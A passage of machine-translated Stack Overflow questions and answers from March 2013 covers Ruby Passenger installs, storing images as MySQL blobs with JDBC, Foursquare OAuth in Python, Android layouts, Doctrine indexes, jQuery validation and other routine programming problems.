/usr/local/bin/ruby /usr/local/bin/rake apache2:clean apache2 RELEASE=yes
# /usr/local/bin/ruby /usr/local/bin/rake apache2:clean apache2 RELEASE=yes
rake aborted!
cannot load such file -- rubygems/builder

(See full trace by running task with --trace)

--------------------------------------------

It looks like something went wrong 
```

我试过：

```
gem install builder 
```

但是这个错误仍然出现。我该如何解决？

* * *

**编辑**

红宝石版本：

```
2.0 p2 
```

宝石清单：

```
bigdecimal (1.2.0)
builder (3.2.0)
bundler (1.3.1)
daemon_controller (1.1.1)
fastthread (1.0.7)
io-console (0.4.2)
json (1.7.7)
minitest (4.3.2)
passenger (3.0.19)
psych (2.0.0)
rack (1.5.2)
rack-protection (1.4.0)
rake (0.9.6)
rdoc (4.0.0)
sinatra (1.3.5)
test-unit (2.0.0.0)
tilt (1.3.4) 
```

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2013-03-10T21:11:12.130

更新说明：

```
$ gem install passenger --version 4.0.0.rc6
$ passenger-install-apache2-module 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-03-05T20:04:34.487

正如此报告的问题所指出的那样，Ruby 2.0 和乘客似乎存在问题：[Passenger Ruby 2.0 issue](https://github.com/FooBarWidget/passenger/pull/71)

建议的解决方案之一（可以在其中的评论之一中找到）：

```
git clone https://github.com/FooBarWidget/passenger.git
cd passenger
gem build passenger.gemspec
gem install passenger-3.9.5.rc3.gem (or type your actual built gem name) 
```

**编辑：**

为了简化过程，还可以按以下方式安装预发布版本（指向任何最新的 RC 版本）：

```
gem install passenger --pre 
```

# java - 如何使用sql代码将图像文件保存到mysql以及如何使用java显示它们？

> ID：15232857
> 
> 赞同：0
> 
> 时间：2013-03-05T19:53:01.237
> 
> 标签：java, mysql, image, file, blob

我想通过 java，文件选择器将图像文件保存到数据库。

我的数据库名称是“gallery_images”，表名是“image_table”，列是“image id(int)”autoincrement、“image(longblob)”和“username(varchar2(45))”。

我可以通过工作台将图像添加到我的mysql数据库到longblob（右键单击longblob单元格，“从文件中加载值”），当我执行它时，它给了我这个代码：

```
INSERT INTO `image_table`.`gallery_images` (`image`, `username`) VALUES (?, 'viktor'); 
```

这 ”？” 应该是图像，所以我没有通过这段代码学到太多东西。当我通过 java 读取文件时，如何将它插入到我的表中（使用 jdbc）？

完成此操作后，我想查询该表中的每个数据：

```
SELECT * FROM image_table; 
```

我想将图像从数据库保存到列表：

```
private List<Image> images; 
```

我想，我应该使用“while（resultset.next（）”，但是我应该如何从结果集中获取图像呢？有人可以帮我吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T21:30:32.870

使用 JDBC 将图像（从本地磁盘上的 JPG 文件）插入 MySQL db：

```
package dbTest;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.sql.DriverManager;

import com.example.pompeymenu.Dish;
import com.mysql.jdbc.Connection;
import com.mysql.jdbc.PreparedStatement;

public class DishAdder {

    /**
     * @param args
     */
    public static void main(String[] args) {
        // TODO Auto-generated method stub

        int bytesRead;

        try {
                //setting filenames
                File[] filesd = new File[6];
                String fileName[] = new String[] {"1.JPG", "2.JPG", "3.JPG", "4.JPG", "5.JPG", "6.JPG"};
                String dishName[] = new String[] {
                        "Cake with cherries",
                        "Tiramisu",
                        "Cheese cake",
                        "Pana Cotta",
                        "Ice cream",
                        "Apple Pie"
                };

                Connection conn = null;
                String userName = "your_user_name";
                String password = "your_db_password";
                String url = "jdbc:mysql://your_db_url";
                Class.forName("com.mysql.jdbc.Driver").newInstance();
                conn = (Connection) DriverManager.getConnection(url, userName, password);
                //Statement s = null;
                PreparedStatement s = null;
                String qryInsert = "INSERT INTO MENU (DISH_NAME, DISH_IMG) VALUES (?, ?)";                  

                //for (int i=5; i<6; i++) {
                    int i=5;
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    filesd[i] = new File("E:/Android/Images/" + fileName[i]);
                    InputStream is = new FileInputStream(filesd[i]);
                    byte[] b = new byte[8096];
                    while ((bytesRead = is.read(b)) != -1) {
                           bos.write(b);
                    }
                    byte[] bytes = bos.toByteArray();

                    //save byte[] to DB

                        s = (PreparedStatement) conn.prepareStatement(qryInsert);
                        s.setString(1, dishName[i]);
                        s.setBytes(2, bytes);
                        s.executeUpdate();  

                //}

                s.close();
                conn.close();

        } catch (Exception e) { e.printStackTrace(); }  

    }

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T21:34:13.613

使用 JDBC 从 MySQL db 读取图像，适用于 Android：

```
import java.sql.DriverManager;
import java.util.ArrayList;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;

import com.mysql.jdbc.Blob;
import com.mysql.jdbc.Connection;
import com.mysql.jdbc.ResultSet;
import com.mysql.jdbc.Statement;

/**
 * 
 * Loads products from external MySql database, registered on db4free.net
 * 
 * @author Rodion Altshuler
 *
 */
public class CatalogDBSource implements CatalogSource{

    Connection conn=null;
    String userName = "???";
    String password = "???";
    String url = "jdbc:mysql://???";

     /**
     * Set this flag=true before calling getProducts(), for example, in order to make several requests to DB
     * without re-opening connection each time
     */
    public boolean flag_closeConnection=true; //if set to false, connection after getProducts() will retain opened 

    /**gets products from external DB
     * needs INTERNET permission and MySQL driver       
    */
    @Override
    public ArrayList<Product> getProducts() {

        Thread getProductsThread = new Thread(new Runnable(){

            @Override
            public void run(){

                try {

                    if (conn==null) {
                            Class.forName("com.mysql.jdbc.Driver").newInstance();
                            conn = (Connection) DriverManager.getConnection(url, userName, password);
                    }

                    Statement s = (Statement) conn.createStatement();
                    //String qry = "SELECT _ID, DISH_ID, DISH_NAME, DISH_CATEGORY, DISH_IMG FROM MENU";     
                    String qry = "SELECT _ID, DISH_NAME, DISH_IMG FROM MENU";       
                    s.executeQuery(qry);

                    ResultSet rs = null;
                    rs = (ResultSet) s.getResultSet();

                    while (rs.next()) {
                        int id = rs.getInt("_ID");
                        String productName = rs.getString("DISH_NAME");
                        Blob b = (Blob) rs.getBlob("DISH_IMG");
                        Bitmap productImg = bitmapFromBlob(b);
                        Product p = new Product(id, productName, productImg, "");
                        //adding new item in ArrayList<Product> products, declared in interface CatalogSource
                        products.add(p);
                    }

        rs.close();      
        s.close();

        if (flag_closeConnection) {
            conn.close();
        }

      } catch (Exception e) {
            e.printStackTrace();                     
      }

      }
    });

    getProductsThread.start();

    try {
        getProductsThread.join();
    } catch (InterruptedException e1) {
        e1.printStackTrace();
    }   

        return products;
    }

    /**
     * Converts Blob to Bitmap 
     * @param b Blob object should be converted to Bitmap
     * @return Bitmap object
     */
    static Bitmap bitmapFromBlob(Blob b)  {

        Bitmap bitmap=null;

        try {
            byte[] temp = b.getBytes(1,(int) b.length());   
            bitmap = BitmapFactory.decodeByteArray(temp,0, temp.length);            
        } catch (Exception e) {
            e.printStackTrace();
        }

        return bitmap;

    }

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T22:11:39.683

```
package fileChooser;

import java.io.*;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.SQLException;

import javax.swing.JFileChooser;
import javax.swing.filechooser.FileFilter;
import javax.swing.filechooser.FileNameExtensionFilter;
public class FileChooserDialog {
  public static void main(String[] args) throws IOException, SQLException {
    JFileChooser fileopen = new JFileChooser();
    FileFilter filter = new FileNameExtensionFilter("c files", "c");
    fileopen.addChoosableFileFilter(filter);

    int ret = fileopen.showDialog(null, "Open file");

    if (ret == JFileChooser.APPROVE_OPTION) {
      File file = fileopen.getSelectedFile();
      System.out.println("file()===>>>"+file);
      String url = "jdbc:mysql://localhost:3306/test";
      String username="root";
      String password="root";
      Connection con=null;
      con = DriverManager.getConnection(url,username,password);
      String sql = "INSERT INTO image (id, image) VALUES (?, ?)";
      PreparedStatement stmt = con.prepareStatement(sql);
      stmt.setInt(1, 1);
      //stmt.setString(2, "Java Official Logo");

      FileInputStream   fis = new FileInputStream(file);
      stmt.setBinaryStream(2, fis, (int) file.length());
      stmt.execute();
      fis.close();
      con.close();
    }
  }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-07T01:35:14.190

如果您只想添加一张图片，我想您可以使用：

INSERT INTO image_table (username, image) VALUES ('viktor',load_file('path/image.jpg'));

# database - 我的winform每秒钟都滞后并卡住

> ID：15232862
> 
> 赞同：0
> 
> 时间：2013-03-05T19:53:12.787
> 
> 标签：database, winforms

我已经构建了一个连接到访问数据库以接收其内容的程序。当我将访问数据库放在本地文件夹中时，程序运行良好（无滞后）。但是，如果我将数据库放在位于全局服务器上的文件夹中，程序就会滞后并每秒卡住。

我的问题是该程序是否被构建为每隔几秒钟自动检查一次数据库，或者它是否仅在被告知时检查数据库。

我非常感谢您的帮助，因为我无法以这种方式取得任何进展。

在此先感谢，拉斐尔。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T20:02:01.077

在不了解需求的情况下，没有人可以知道客户端程序应该多久从数据源中检索数据或如何触发（轮询、通知和用户操作）。

也就是说，听起来您经常检索数据，也许比您应该更频繁地检索数据，并且您正在主 UI 线程上执行此操作。

如果我是你，我会设置某种缓存策略并使用[BackgroundWoker](http://msdn.microsoft.com/en-us/library/system.componentmodel.backgroundworker.aspx)更新我的缓存，而不是每隔几秒就锁定应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T19:56:21.903

该程序只有在您告诉它时才会访问数据库。不过，访问网络上的数据库是您应该非常小心的事情。如果您将它放在网络上，很可能会有多人同时访问它，您必须注意在发生这种情况时会遇到的问题。

如果您需要多个客户端访问数据库，则应考虑使用 MySQL 或 SQL Express 之类的数据库或其他一些关系数据库管理系统。

# python - Foursquare API Python 访问令牌错误

> ID：15232863
> 
> 赞同：3
> 
> 时间：2013-03-05T19:53:15.443
> 
> 标签：python, api, oauth-2.0, foursquare, httplib2

我正在尝试通过 Python 从 Foursquare API 获取访问令牌。

我正在使用来自[https://github.com/mLewisLogic/foursquare](https://github.com/mLewisLogic/foursquare)的包装器， 并且遵循[http://log.hckr.org/2012/02/01/foursquare-api-wrapper-for-中提到的相同方法Python](http://log.hckr.org/2012/02/01/foursquare-api-wrapper-for-python)

但是，对于`access_token = client.oauth.get_token('XX_CODE_RETURNED_IN_REDIRECT_XX')`. 我收到以下错误

```
Traceback (most recent call last):
  File "<interactive input>", line 1, in <module>
  File "C:\Python27\lib\site-packages\foursquare\__init__.py", line 135, in get_token
    response = _request_with_retry(url)
  File "C:\Python27\lib\site-packages\foursquare\__init__.py", line 707, in _request_with_retry
    return _process_request_with_httplib2(url, data)
  File "C:\Python27\lib\site-packages\foursquare\__init__.py", line 733, in _process_request_with_httplib2
    raise FoursquareException(u'Error connecting with foursquare API')
FoursquareException: Error connecting with foursquare API 
```

我不确定错误是由于 httplib2 库还是其他原因！

任何人有任何解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-29T02:00:16.113

看起来您选择的包装器可能已过时。

如果您愿意接受更通用的 OAuth 消费者解决方案，我可以推荐[rauth](https://github.com/litl/rauth)。Rauth 是一个围绕请求构建的简单 OAuth 1.0/a 和 2.0 客户端。基本上你想要做的是将 FourSquare 设置为服务。我们可以修改我们为 rauth 提供的 Facebook 示例，如下所示：

```
from rauth import OAuth2Service

import re
import webbrowser

# Get a real client_id and client_secret from:
# https://developer.foursquare.com/overview/auth#registration

foursquare = OAuth2Service(
    client_id=xxx,
    client_secret=xxx,
    name='foursquare',
    authorize_url='https://foursquare.com/oauth2/authenticate',
    access_token_url='https://foursquare.com/oauth2/access_token',
    base_url='https://api.foursquare.com/v2/')

# This should redirect to your app, may function as a demo
# without updating, but be sure to update once you're done
# experimenting!
redirect_uri = 'https://example.com/'

params = {'response_type': 'token',
          'redirect_uri': redirect_uri}

authorize_url = foursquare.get_authorize_url(**params)

print 'Visit this URL in your browser: ' + authorize_url
webbrowser.open(authorize_url);

url_with_code = raw_input('Copy URL from your browser\'s address bar: ')
access_token = re.search('\#access_token=([^&]*)', url_with_code).group(1)
session = foursquare.get_session(access_token)

user = session.get('users/self').json()['response']['user']

print 'currently logged in as: ' + user['firstName'] 
```

我还没有运行此代码，但可以随意尝试一下（请记住，您必须将自己的凭据放入服务构造函数中，即`client_id`和`client_secret`参数，然后它才能正常运行。祝你好运，如果你让我知道它是怎么回事决定试一试！

完全披露，我保持沉默。

# c# - 是否有设计模式/知道管理文件的好方法？

> ID：15232864
> 
> 赞同：0
> 
> 时间：2013-03-05T19:53:18.757
> 
> 标签：c#, sql-server, file-io

我正在开发一个库存管理应用程序。我可以创建的每一种项目都继承了一个带有一些字段（创建日期、描述等）的通用基类。所有这些项目都可以有文档文件（pdf、文本文件、图片，没关系）。这些文件存储在公开可用的网络共享上。我已经有了一个基本的功能原型，它可以：要求用户选择一个文件，上传它，打开它并将相关信息保存在数据库中。这是一个基本示例：

```
//choosing and copying the file
string filename;
string destination;
Microsoft.Win32.OpenFileDialog dlg = new Microsoft.Win32.OpenFileDialog();                       
Nullable<bool> result = dlg.ShowDialog();
if (result == true)
{
  filename = dlg.FileName;
  destination = @"\\theshare\Data\Doc\";
  textBox1.Text = filename;//just for test/display purpose
  File.Copy(filename, destination + dlg.SafeFileName);
  SaveInfoInDatabase(dlg);//description, path
}

//open the file with default application, called by a button press
System.Diagnostics.Process.Start(destination + dlg.SafeFileName); 
```

在继续之前，我问自己以下问题：

1.  我应该异步运行这段代码吗？目前最大的文件约为 50 MB
2.  我应该对文件名使用 GUID 而不是原始名称，还是在文件名相同的情况下在末尾添加一个数字？
3.  我应该如何处理重复？（假设 20 个不同的项目都共享相同的
    pdf 文档）
4.  我应该保存绝对路径还是只保存文件名并为目录使用 const 字符串？
5.  如果可以修改文件，我应该制作本地副本，打开然后复制回来，还是打开原始文件？并发不是一个大问题，它主要是参考资料。
6.  我走错路了吗？这类任务可能有设计模式/指南，但我没有发现任何重要的东西。
7.  我应该以其他方式打开文件吗？也许问用户？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-05T20:12:43.560

我过去不得不构建系统。以下是我解决这些问题的方法：

1.  是的。不要阻塞 UI 线程。
2.  对文件名使用 GUID/任何 db 键。
3.  不。在我的应用程序中，每个文件都可能经过多次修订，并且仅仅因为一个文件在 1.0 版本是重复的，并不意味着它们将来不会出现分歧。
4.  不要将文件名直接存储在数据库中，尤其是绝对路径。使用更高级别的代码从 DB GUID / ID <=> 文件名进行转换。
5.  是的。切勿直接修改源文件。您甚至可能想要包含一个签入/签出系统，以防止两个人编辑同一个文件。
6.  如果您不从一开始就限制您的范围（事实上任何软件产品都可以），这些类型的项目可能会很快失控。我建议您在继续之前确保这确实是您所需要的。
7.  不。在客户端系统上使用默认应用程序比我见过的任何替代方案都容易得多。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-05T20:09:56.043

很多问题都不是真正与代码相关的，但我遇到过像你以前遇到的问题，所以我会尝试一下

1.  我会说，绝对是的。我已经为此目的使用了[Task](http://msdn.microsoft.com/en-gb/library/system.threading.tasks.task.aspx)类，但是如果您使用的是 .Net 4.5，则可以使用[await](http://msdn.microsoft.com/en-gb/library/vstudio/hh191443.aspx)。
2.  我在以前的工作中遇到了同样的问题，我使用 GUIDS 作为文件名，因为它们非常（足够）独特
3.  您必须澄清这一点，如果某些项目使用相同的文档，也许您可​​以存储对 PDF 的引用（在检查它是否存在之后）
4.  我只会存储你必须的东西。如果文件位置在同一个地方并且永远不会改变***（事情总是在改变）***，那么我认为只存储文件名没有任何害处。事情确实发生了变化，请注意这一点，因此请尝试使文件位置可配置（app.config、web.config 等）
5.  我正在传输业务关键文件 - 我使用 File.Copy，直接从源到目标。在将任务标记为已完成之前，我进行了一些额外的检查，以确保文件存在于目标上。大多数时候似乎都很好，如果它由于某种原因失败，它会重试直到它可以复制它。所以你可以调整你的应用程序来做同样的事情，即尝试复制文件，检查文件是否存在，返回成功。
6.  我认为因为它是文件，所以您总是必须处理文件周围的愚蠢问题（锁定、异常等）。管理这个的最好方法是一个好的框架，从小处着手，只有两个文件夹，然后编写一个控制台应用程序，循环遍历每个文件，将其复制到另一个目录，然后逐步向上。我还没有看到用于管理文件的硬性指南或设计模式，但您可以为它制作一个相当健壮且可重用的框架。
7.  用户不是通过上传文件来问你吗？

# android - 使用 ArrayAdapter 和其他小部件进行布局

> ID：15232866
> 
> 赞同：0
> 
> 时间：2013-03-05T19:53:20.187
> 
> 标签：android, android-linearlayout, android-arrayadapter

我编写了这样的简单 xml 布局代码：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical"
android:paddingBottom="@dimen/activity_vertical_margin"
android:paddingLeft="@dimen/activity_horizontal_margin"
android:paddingRight="@dimen/activity_horizontal_margin"
android:paddingTop="@dimen/activity_vertical_margin"
tools:context=".MainActivity" >

<TextView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="ARRAYADAPTER" />

<ListView
    android:id="@+listview/lw"
    android:layout_width="match_parent"
    android:layout_height="wrap_content" >
</ListView>

<Button 
    android:id="@+button/b1"
    android:layout_width="wrap_content"
    android:layout_height="match_parent"
    android:text="NEXT"
    android:gravity="center"/>

</LinearLayout> 
```

并在列表视图中设置一个数组适配器。当我启动这个应用程序时，没有出现按钮。我想要做的是将布局分为三个部分： - 顶部的文本视图 - 中间的适配器（带有滚动） - 底部的按钮（或多个）。我该怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:56:05.770

我认为您的 Button 占用了所有空间`android:layout_height="match_parent"`，请尝试`android:layout_height="wrap_content"`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:56:38.673

将您的 ListView 声明更改为：

```
<ListView
    android:id="@+listview/lw"
    android:layout_width="match_parent"
    android:layout_height="0dp"
    android:layout_weight="1"
    /> 
```

并将您的 Button 高度设置为`wrap_content`.

这将告诉 ListView 占用 TextView 和 Button 未占用的剩余空间。

# django - Django应用程序的登录用户的负载平衡（或http代理）？

> ID：15232871
> 
> 赞同：10
> 
> 时间：2013-03-05T19:53:45.997
> 
> 标签：django, load-balancing

通过用户名对 Django 应用程序的用户进行负载平衡（或在某种意义上分片）用户的有效方法是什么？我想标记 Django 应用程序的某些用户，并让他们在登录后转到不同的 Web 服务器。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-24T20:20:26.293

如果您想在特定服务器上拥有特定用户：创建多个子域（www.example.com、www1.example.com、www2.example.com 等）。用户登录后，检查用户是否在正确的域/服务器上。如果没有，请重定向到用户子域。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-24T11:15:14.087

我们正在使用 HA-Proxy 来处理托管在 34 多台服务器上的 18 个不同应用程序的类似要求。

[http://haproxy.1wt.eu/](http://haproxy.1wt.eu/)
[https://code.google.com/p/haproxy-docs/](https://code.google.com/p/haproxy-docs/)

如果您需要有关如何配置它的进一步帮助，我会随时提供帮助。

希望这会有所帮助。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-25T15:00:42.697

登录后，您可以使用用户名设置额外的 cookie（它的哈希值、电子邮件的哈希值、user_id 的哈希值等）

通过使用 ha-proxy，您可以基于 cookie 进行负载平衡。有关 ha-proxy 的文档中提供了更多信息（但我相信 nginx 也可以这样做）。

# jquery - jQuery：SimpleModal 在显示时滚动到底部？

> ID：15232875
> 
> 赞同：0
> 
> 时间：2013-03-05T19:54:09.480
> 
> 标签：jquery, jquery-ui, modal-dialog, simplemodal

[使用http://www.ericmmartin.com/projects/simplemodal/](http://www.ericmmartin.com/projects/simplemodal/)中的 jQuery 插件

我有一个简单的模型 div。当它打开时，div 滚动到文本的底部。这是一个功能，如果是这样，当 SimpleModal 显示时，如何让 div 不将内容滚动到底部？

我试图强迫它滚动到顶部。

```
 $(function () {
        $('#agreement-modal-content').modal(
            {
                autoResize: true,
                onShow: function (dialog) {
                    $('#agreement-modal-content').scrollTop();

                }
            }
        );
    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T17:19:58.293

> ```
>  $('#agreement-modal-content').modal(
>             {
>                 focus: false,    <<<---- Set to false 
> ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-11T05:25:45.733

我有同样的问题，因为页面没有定义文档类型，但我通过将模态作为绝对位置来修复。由于页面可能会被滚动并且模态可能会被隐藏，所以我们需要在调用显示模态之前将其滚动到顶部。

使用 css 绝对定位模态：

```
#simplemodal-container {
position:absolute!important;
top:50px!important;
left:200px!important;
} 
```

首先滚动顶部并调用以显示模式：

```
// Scroll to top of page so that modal could be visible
$('body').scrollTop(0);

// Show modal now
$('#emailProgress').modal(); 
```

# uiimage - 带有颜色的 UIImage 绘图

> ID：15232876
> 
> 赞同：0
> 
> 时间：2013-03-05T19:54:09.730
> 
> 标签：uiimage, uigraphicscontext

我有两个 UIImageViews，我想将图像从一个复制到另一个并调整颜色，但这会导致奇怪的拉伸。

这是我用来制作副本的代码：

```
_selectedIcon.image = groupView.icon;
[ViewUtils colorImageView:_selectedIcon withRed:0.843 Green:0.3176 andBlue:0.066667]; 
```

如果我只使用第一行，它会很好地复制图像，看起来像这样：

![正确的](../Images/505421f85ade554299f66a732e063e95.png)

它有点大，因为它看起来突出显示。但它会复制并正确缩放。然后当我尝试为它着色时，它会这样做：

![错误的](../Images/280a080bf0c31505d243b989525f7fee.png)

这是我用来为图像着色的代码：

```
+(void)colorImageView:(UIImageView*)source withRed:(CGFloat)red Green:(float)green andBlue:(float)blue
{
    // Create a context containing the image.
    UIGraphicsBeginImageContext(source.bounds.size);
    CGContextRef context = UIGraphicsGetCurrentContext();

    // The mask needs to be upside down for some reason
    CGContextTranslateCTM(context, 0, source.bounds.size.height);
    CGContextScaleCTM(context, 1.0, -1.0);
    CGContextClipToMask(context, source.bounds, [source.image CGImage]);
    CGContextFillRect(context, source.bounds);

    [[UIColor colorWithRed:red green:green blue:blue alpha:1.0] set];
    UIBezierPath *imagePath = [UIBezierPath bezierPathWithRect:source.bounds];
    [imagePath fill];
    // Retrieve the new image.
    source.image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
} 
```

我尝试了许多不同的方法来缩放着色代码中的图像，但似乎没有任何效果。有人有建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T18:03:22.220

我想到了。图像正在拉伸以适合整个 UIImageView，因此我需要调整边界以使其正确缩放。这是我使用的代码：

```
float ratioX = source.bounds.size.width / source.image.size.width;
float ratioY = source.bounds.size.height / source.image.size.height;
float ratio = MIN(ratioX, ratioY);
CGRect bounds = CGRectMake(0, 0, source.image.size.width * ratio, source.image.size.height * ratio); 
```

# python - 使用字典翻译短语

> ID：15232877
> 
> 赞同：1
> 
> 时间：2013-03-05T19:54:11.417
> 
> 标签：python

我试图通过将短语中的每个单词与字典的键匹配来使用字典翻译短语。

[http://paste.org/62195](http://paste.org/62195)

我可以通过交互式外壳很好地翻译它，但是当涉及到实际代码时：

```
def translate(dict):
    'dict ==> string, provides a translation of a typed phrase'
    string = 'Hello'
    phrase = input('Enter a phrase: ')
    if string in phrase:
         if string in dict:
            answer = phrase.replace(string, dict[string])
            return answer 
```

我不确定要设置什么字符串来检查除“你好”之外的任何内容。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-05T20:32:29.560

正如人们提到的那样，替换不是一个好主意，因为它匹配部分单词。

这是使用列表的解决方法。

```
def translate(translation_map):
    #use raw input and split the sentence into a list of words
    input_list = raw_input('Enter a phrase: ').split()
    output_list = []

    #iterate the input words and append translation
    #(or word if no translation) to the output
    for word in input_list:
        translation = translation_map.get(word)
        output_list.append(translation if translation else word)

    #convert output list back to string
    return ' '.join(output_list) 
```

正如@TShepang 所建议的那样，避免使用诸如字符串和字典之类的内置名称作为变量名是一种很好的做法。

# symfony - Symfony 2.1 中的教义：多列上的字段、列和索引

> ID：15232887
> 
> 赞同：1
> 
> 时间：2013-03-05T19:54:42.057
> 
> 标签：symfony, doctrine, yaml, symfony-2.1

我对 symfony2 和教义还很陌生，最近遇到了一个我无法修复的索引问题。

这是我的经验.yml：

```
Test\PersoBundle\Entity\Experience:
type: entity
repositoryClass: Thibanir\PersoBundle\Repository\ExperienceRepository
table: experience
indexes:
    exp: 
        columns: [slug,company_id,begin_date,end_date,is_current]
        type: unique
id:
    id:
        type: integer
        generator: { strategy: AUTO }
fields:
    type:
        type: string
        length: 255
    begin_date:
        type: datetime
    end_date:
        type: datetime
        nullable: true
    is_current:
        type: boolean
        default: false
    title:
        type: string
        length: 255
    description:
        type: text
    slug:
        type: string
        length: 255
manyToOne:
    company:
        targetEntity: Company
        inversedBy: companies
        joinColumn:
            name: company_id
            referencedColumnName: id 
```

当我查看mysql中生成的索引时，我可以看到它，但是Unique标志设置为`False`

当我查看有关创建索引的[教义文档](http://docs.doctrine-project.org/projects/doctrine1/en/latest/en/manual/defining-models.html#adding-indexes)时，我看到的语法的唯一区别是我反转了关键字`Fields`and `Columns`。我这样做是因为我在本[教程](http://www.ens.ro/2012/03/27/symfony2-jobeet-day-3-the-data-model/)中学到了它。

如果我尝试反转两个关键字以匹配此语法：

```
indexes:
    exp: 
        fields: [slug,company_id,begin_date,end_date,is_current]
        type: unique
id:
    id:
        type: integer
        generator: { strategy: AUTO }
columns:        
    type:
        type: string
        length: 255s:
    [...] 
```

当我发出`php app/console doctrine:schema:update --force`以下错误时：

```
[ErrorException]                                              
Notice: Undefined index: columns in /home/test/Project/perso/vendor/doctrine/orm/lib/Doctrine/ORM/Mapping/Driver/YamlDriver.php line 199 
```

这是我的两个问题：

1.  Doctrine 中的字段和列有什么区别（我在他们的网站上找不到答案）？
2.  如何在多个列上创建唯一索引？

非常感谢你的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-27T09:04:41.327

字段和列的区别字段是实体中属性的名称。Column 是 SQL 表中列的名称。例如，

```
createdAt:
      type: datetime
      column: created_at 
```

这里，实体中的属性名将被createdAt，而该实体对应的SQL表中的列名将被created_at。如果不指定列，则 SQL 表中的列名将与属性名相同。在这种情况下，createdAt。

要在多个列上创建唯一索引，请指定

```
unique:true 
```

对于每个字段。例子：

```
socialId:
  type: bigint
  column: social_id
  unique: true

playerId:
  type: bigint
  column: player_id
  unique: true 
```

# javascript - 关于 JQuery UI 的两个问题

> ID：15232888
> 
> 赞同：0
> 
> 时间：2013-03-05T19:54:42.290
> 
> 标签：javascript, jquery, forms, jquery-ui, jquery-effects

所以我在这里做了一个快速的注册表单：

[http://jsfiddle.net/pBEt2/](http://jsfiddle.net/pBEt2/)

Javascript：

```
$(document).ready(function(){
    $('input:button').click(function(){
        $('input[type="text"]').each(function(indx){
            var $currentField = $(this);
            if ($currentField.val() === ''){
                $currentField.addClass('empty');
                $('#answer').html("Please fill out all fields");
            } else{
                $currentField.removeClass('empty');
                $('#answer').html("Thank you!");
                $('#answer').effect('blind');
            }
        });
});
}); 
```

无论如何，一旦你填写了所有字段，它会给你一个回复说“谢谢”，我制作了一个 Jquery 效果（称为“百叶窗”），这使得文本上升：

第一个问题：

使用当前代码，文本“thank you”向上滑动 4 次，因为总共有四个输入。有什么理由吗？我该如何解决？

第二个问题：

我该如何制作才能使效果在几秒钟后实际上不会生效。这样用户可以看到文本然后允许它向上滑动？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-05T19:57:45.770

您使用`$('input[type="text"]').each(function(indx)...`了 ，因此对于任何`input`拥有`type=text`它的人都运行此代码：

```
$('#answer').html("Thank you!"); 
```

我编辑了你的代码和你的 jQuery：

```
$(document).ready(function(){

    $('input:button').click(function(){
        var flag = true;
        $('input[type="text"]').each(function(indx){
            var $currentField = $(this);
            if ($currentField.val() === ''){
                $currentField.addClass('empty');
                flag=false;
            } else{
                $currentField.removeClass('empty');
            }
        });
        if(flag){
            $('#answer').css('display','block');
            $('#answer').html("Thank you!");
        }
        else
            $('#answer').html("Please fill out all fields");
});
}); 
```

[http://jsfiddle.net/pBEt2/7/](http://jsfiddle.net/pBEt2/7/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-05T19:57:50.203

```
$(document).ready(function(){
      var error = false;
    $('input:button').click(function(){
        $('input[type="text"]').each(function(indx){
            var $currentField = $(this);
            if ($currentField.val() === ''){
                $currentField.addClass('empty');
                $('#answer').html("Please fill out all fields");
                error = true;
            } else{
                $currentField.removeClass('empty');

            }
        });
});

    if(error == true){
          $('#answer').html("Thank you!");
         $('#answer').effect('blind');
    }
}); 
```

您使用了每个。所以它迭代了 4 次。因为我们有 4 个输入字段。通过使用此代码，您可以解决问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-05T20:08:05.530

```
$(document).ready(function(){
    $("#answer").slideUp();
    $('input:button').click(function(){
        var correct = true;
        $('input[type="text"]').each(function(indx){
            var $currentField = $(this);
            if ($currentField.val() === ''){
                $currentField.addClass('empty');
                correct=false;
            } else{
                $currentField.removeClass('empty');
            }
        });

        $("#answer").slideDown();
        if(correct){
            $('#answer').html("Thank you!");
            setTimeout(function () {
               $("#answer").slideUp();
            }, 3000);//this is the time you want to wait.
        }
        else{
            $('#answer').html("Please fill out all fields");
        }
    });
}); 
```

# mongoose - MongooseJS - 根据数组中的 ObjectIds 检索所有文档

> ID：15232889
> 
> 赞同：0
> 
> 时间：2013-03-05T19:54:43.103
> 
> 标签：mongoose

我正在使用带有 Express/Node 的 MongooseJs。

我有一个这样的架构：

```
ParentSchema = {  
    _id: ObjectID,
    children = [ObjectId]
} 
```

我有另一个这样的架构：

```
ChildSchema = {  
    _id: ObejctID,
    name: String
    age: Number
} 
```
